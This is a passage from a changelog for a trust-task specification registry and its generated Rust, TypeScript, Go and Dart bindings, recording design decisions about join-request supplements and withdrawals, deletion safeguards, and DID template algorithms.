    needing an attested value asks for a credential instead.
  - vtc/join-requests/submit/0.2: optional `attributes` -- [{type, value}],
    bound to the applicant by the document proof. New codes
    attributesMissing (a required one is absent) and attributesUnrequested
    (a type the manifest does not request -- refused rather than stored, so
    an over-sharing client cannot leave data with a community that never
    asked). SHOULD be sent through the applicant's own disclosure path so
    their record of what they told whom includes it.
  - vtc/_shared JoinRequest: optional `attributes`, so show and list carry
    the answers to reviewers, as the applicant's own statement.

  Bindings regenerated in Rust, TS, Go and Dart.

## 0.1.10 — 2026-09-21


### Added

- **persona**: Honest pins, purge-version, and entry slots (#538)

## 0.1.9 — 2026-09-21


### Specifications

- **persona**: Lifecycle answers — disclosure currency, edit reach, binding label (#533)

Additive members on existing 1.0 schemas, plus normative prose. From the
  persona context-first design note (verifiable-trust-infrastructure,
  docs/05-design-notes/persona-context-first.md, sections 3.2, 3.4, 9.2, 9.3).

## 0.1.8 — 2026-09-21


### Specifications

- **vtc/join-requests/supplement**: Vetting travels in the presentation, so it is replaced with it (#531)

#526 stated that vetting attestations are "attached to the request, not to the
  presentation", and that a consumer MUST NOT discard them when the presentation
  is replaced. That is wrong, and I found it while implementing the consumer
  side.

  A community counts vetting by reading the attestations **out of the
  presentation** it was handed — in the reference implementation,
  `vetting_credentials(vp)` filters the VP's `verifiableCredential` array. The
  per-request vetting record that does exist is a *record*: it answers the admin
  view, the vetter sweep, and the question of which admissions a later-withdrawn
  statement counted toward. No decision reads it. So there is nothing on the
  request for a consumer to decline to discard, and a supplement whose
  presentation omits the attestations is one with no vetting.

  The claim was also internally inconsistent with the rule immediately above it.
  Carrying forward attestations from a superseded presentation is accumulation —
  it decides the request on evidence the applicant is no longer presenting, which
  is exactly the defect the replace-not-merge rule exists to prevent. It merely
  arrives by a different route, so the corrected text forbids it explicitly.

  What survives is the promise underneath, which is the part that mattered: a
  vetting attestation is a credential the **applicant** holds, so re-presenting
  it costs the vetter nothing and no one attests twice. The obligation this puts
  on a deferring community is now stated — name the attestations in the
  `presentationDefinition` alongside everything else required.

  The Correlation subsection carried the same error ("it is what lets vetting
  survive") and is corrected to what the linkage actually buys: the applicant
  keeps their place rather than starting again.

  Prose only, in place, per SPEC §5.2's draft rule — no schema change, so the
  bindings are untouched.

## 0.1.7 — 2026-09-21


### Added

- **vtc/join-requests/supplement**: Let a deferred applicant answer, instead of starting over (#526)

Keyring finding KR-03, the half not closed by `join-requests/withdraw/0.1`
  (#518). A community that cannot decide a request on what it was given defers it
  and says what more it needs — and until now the applicant had nowhere to put
  the answer. The request stays open, `join-requests/submit`'s dedup rule refuses
  a second application, and the only ways out are to withdraw (discarding the
  vetting already gathered) or to wait for a retention sweep neither party
  controls. A deferral was a dead end dressed as a question.

  This task is the answer: the applicant re-presents against the request that
  already exists, the community re-runs its admission policy, and returns a fresh
  verdict.

  ## The response is submit's response

  `{requestId, verdict}` over the shared `Verdict`, exactly as
  `join-requests/submit/0.2` returns. A supplement has precisely the outcomes a
  submission has — including a further `requestMore`, because the community is
  entitled to still not be satisfied, and including `deny` — so a client that can
  read one reads the other with no second code path.

  ## Three decisions that had a tempting wrong answer

  **The presentation replaces, it does not accumulate.** Merging a new
  presentation with the old one produces a claim set the applicant never
  presented and never signed as a whole, covered by no single proof; a consumer
  could not then say what the applicant actually asserted at the moment it
  admitted them. The cost is that the applicant re-presents everything rather
  than only the shortfall, so the spec tells a deferring community to describe
  the whole requirement in its `presentationDefinition`.

  **Replacement governs the presentation and nothing else.** Vetting attestations
  are attached to the request, not to the presentation, and a consumer MUST NOT
  discard them when the presentation is replaced. A vetter who has already
  attested does not attest again because the applicant answered a question about
  a credential. This is what makes supplementing meaningfully different from
  withdraw-and-resubmit, which throws that work away.

  **A merely-queued request cannot be supplemented** — `notAwaitingEvidence`, a
  precondition and not an authorization rule. A `refer`red request waits on the
  community, not on the applicant; accepting new evidence into it would replace
  what a maintainer is reviewing underneath them, leaving the document they were
  reading no longer the one they were asked to decide. An applicant who wants to
  change a request nobody asked them to change withdraws and submits afresh,
  which is visible to everyone.

  ## Other declarations

  Authorization is ownership, as on withdraw: the proven issuer must be the
  applicant on the request, which is the whole entitlement because an applicant
  holds no membership or capability. `notFound` covers both "no open request" and
  "not yours", so the task cannot be used to probe which request ids exist.

  `issuedAt` is REQUIRED because a supplement is replayable in a way a submission
  is not: the request it targets outlives it, so a replay re-runs the policy
  against evidence the applicant has since replaced and can overwrite a newer
  verdict with an older one.

## 0.1.6 — 2026-09-20


### Specifications

- **vtc/endorsement-types/delete**: A criterion requiring the type also blocks its deletion (#523)

The spec described one kind of reference — a live endorsement — and the
  `inUse` refusal as being about orphaned endorsements alone. A second kind
  exists wherever the consumer also holds admission criteria: a criterion
  requiring statements of the type is left asking applicants for evidence the
  community no longer recognises. Where registering such a criterion against
  an unregistered type is itself refused, deleting the type strands the
  criterion in a state it could not have been created in.

  `inUse` now covers both, and gains a `detailsSchema` so a consumer that can
  determine both reports which applies rather than leaving the caller to
  parse prose. `liveEndorsements` and `criteria` are each optional, because
  neither an endorsement store nor a criteria registry is mandatory — and the
  spec says plainly that an absent member means "not applicable here", not
  "none found", so a caller cannot read silence as an all-clear.

  Conformance asks a consumer that can determine both to gather both before
  refusing. Refusing on the first found turns one determination into as many
  round trips as there are kinds of reference, each ending in the same code.

  Security & Privacy gains what the refusal discloses: `details` names
  criteria by identifier, which is a governance fact the authorised
  administrator can already enumerate, and is reachable only after the
  community-admin capability has been verified.

  In place on 0.1 rather than a new version: the spec is `draft`, no payload
  or response shape changes, and no previously-valid document becomes
  invalid.

  Implemented in verifiable-trust-infrastructure#1584, which added the
  criterion check and reported both causes in one refusal.

## 0.1.5 — 2026-09-20


### Added

- **vtc/join-requests**: Withdraw/0.1 — an applicant closes their own request (#518)

An applicant whose request is answered `requestMore` has no way to end it.
  The community holds it open, the applicant cannot submit another, and the
  only thing that resolves it is a retention sweep neither party controls.

  The registry already assumed this task existed: `join-requests/status/0.1`
  lists `withdrawn` among the states it can report, and nothing could reach
  it. This is the task that does.

  Modelled on `members/self-remove/0.1` — the same shape of act, a subject
  exercising authority over their own record — and scaffolded with
  `npm run new-spec` rather than copied from it, per CONTRIBUTING-SPECS.md.

  Three things worth review:

  **`requestId` is OPTIONAL**, following `join-requests/status/0.1` and for
  the same reason: an applicant whose submit response was lost never received
  an id, and would otherwise have no way to reach their own request. A
  consumer given one MUST prefer it over inferring the request from the
  caller.

  **`issuedAt` is REQUIRED for a reason specific to this task**, beyond the
  §7.3 item 17 floor. An applicant may withdraw and then apply again — that
  is the point of it — so a captured withdrawal replayed later does not
  repeat a harmless act: it closes the *next* request, which the applicant
  never withdrew. The two documents are identical apart from when they were
  issued.

  **`notFound` deliberately conflates "no open request" with "not yours"**,
  so a caller cannot probe whether a given request id exists on a community.
  `alreadyDecided` is kept distinct because an applicant is entitled to know
  the outcome of their own request, and because retrying will never change
  it.

  Bindings regenerated for all four targets; `check-bindings` reports 452
  specs against 452 TypeScript, 447 Rust, 452 Go and 452 Dart modules, all
  agreeing. No version or changelog edits — release-plz owns those here.

## 0.1.4 — 2026-09-19


### Added

- **vta/contexts**: Preview the whole subtree a delete destroys, and report host copies it could not remove

Deleting a context deletes its sub-contexts and everything they hold, to any depth. Neither vta/contexts/delete/1.0 nor its preview said so, and the preview had nowhere to say what the cascade would reach.

  vta/contexts/preview-delete/1.0 gains subContexts, with the existing arrays defined as the union over the whole subtree. The narrower reading — preview the named context alone — is the natural one and is dangerous: a context whose children hold keys and DIDs previews as holding nothing, and a caller deciding whether the delete needs force decides about the wrong thing.

  vta/contexts/delete/1.0 gains daemonCleanupErrors, the subtree-wide form of the daemonCleanupError that vta/webvh/dids/delete/1.0 already reports for a single DID, and now requires that a did:webvh DID in the subtree be deleted the way that task deletes one — published log removed from its hosting server, credentials revoked, authority withdrawn. Removing only the local record is not a deletion: the log keeps resolving for every party except its owner, and the records that could remove it are the ones just destroyed.

  Both members are optional and additive; the refusal and cascade prose describes behaviour that was already implemented but unstated.

## 0.1.3 — 2026-09-17


### Added

- **vta/did-templates**: A template can declare which algorithms its keys use (#508)

* feat(vta/did-templates): a template can declare which algorithms its keys use

  Adds `vta/_shared/0.2/did-template.schema.json` and `create`, `update`, `get`
  and `list` at `3.0`. A template's `keys` block names each key slot's purpose and
  its acceptable algorithms, most preferred first:

      "keys": {
        "signing": { "purpose": "signing", "algorithms": ["mldsa44", "ed25519"] },
        "ka":      { "purpose": "keyAgreement", "algorithms": ["x25519"] }
      }

  A list rather than a single value because a fleet does not migrate atomically:
  that says mint ML-DSA-44 where the implementation can and Ed25519 otherwise, so
  one template serves a VTA with post-quantum support and one without.

  ## Why a new shared version rather than an edit

  `DidTemplate` lives in `_shared/0.1`, which the shipped 1.0 and 2.0 specs
  reference. Editing it in place would retroactively change what those versions
  mean, which is what versioning exists to prevent. `_shared/0.2` follows the
  precedent `credentials` and `device` already set, and 1.0/2.0 keep pointing at
  0.1.

  ## Why four task families, not two

  `create` and `update` carry a `DidTemplate`; `get` and `list` return a
  `DidTemplateRecord`, which flattens the same fields. A stored v2 template
  fetched through `get/2.0` would fail validation, so all four move together —
  otherwise the template can be written and not read back.

  ## The change is breaking, for a stronger reason than expected

## 0.1.2 — 2026-09-16

## 0.1.1 — 2026-09-16


### Fixed

- **dart**: Take trust_tasks to 160/160 on pub.dev (#473)

pub.dev scored the published 0.1.0 at 140/160, with two specific deductions.

  -10 "The package description is too long." The field was 196 characters against
  a 60-180 window; search results only render the first part of it, which is why
  pub.dev treats an over-long one as a failed pubspec check rather than a style
  note. Now 148, with the window recorded in a comment above it so the next edit
  does not silently fall outside it again.

  -10 "No example found." Adds example/main.dart, which is runnable rather than
  illustrative: it decodes an inbound document, runs it through consumeInbound
  against the generated acl/grant policy, and delivers it three times to show both
  halves of SPEC §7.2 item 11 —

    first delivery    : handled -> .../acl/grant/0.1#response
    identical resend  : duplicate (already executed, inFlight=false)
    escalated resend  : rejected -> idConflict
    handler ran 1 time(s) — the effect happened exactly once.

  Writing it as something that runs is what caught a bug in it: the first draft
  omitted the proof acl/grant declares REQUIRED, so all three deliveries returned
  proofRequired and the example demonstrated a rejection rather than the pipeline.

  Verified with pana 0.23.19 — the analyzer pub.dev runs — against the working
  tree: Points: 160/160. `dart analyze --fatal-infos`, the format check and the
  74 tests all still pass with example/ included in the analysed set.

  The score will not move until a release carries these files, so the improvement
  lands with 0.1.1 — which is also the first version the trusted-publishing
  automation will publish end to end.

## 0.1.0

### Added

- Initial release: generated payload types for every specification in the
  registry, and the hand-written SPEC.md §7.2 consumer pipeline in
  `lib/src/runtime/`.
